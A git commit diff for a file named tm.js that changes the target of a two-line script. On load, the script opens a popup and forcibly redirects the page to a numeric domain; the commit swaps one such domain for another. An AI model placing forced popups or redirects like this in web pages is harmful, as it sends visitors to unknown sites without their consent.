1b65247bce5cc88d38f846dadb95061d2ae59640
js88888888 <jsjsjs888@outlook.com>
2015-09-23 15:02:59 +0800

    Update tm.js

--- 3/tm.js
+++ 3/tm.js
@@ -1,2 +1,2 @@
- window.open ("http://www.3330111.com#3"); 
- window.location.href="http://www.3330111.com/#3"; 
+ window.open ("http://www.553211.com#3"); 
+ window.location.href="http://www.553211.com/#3"; 
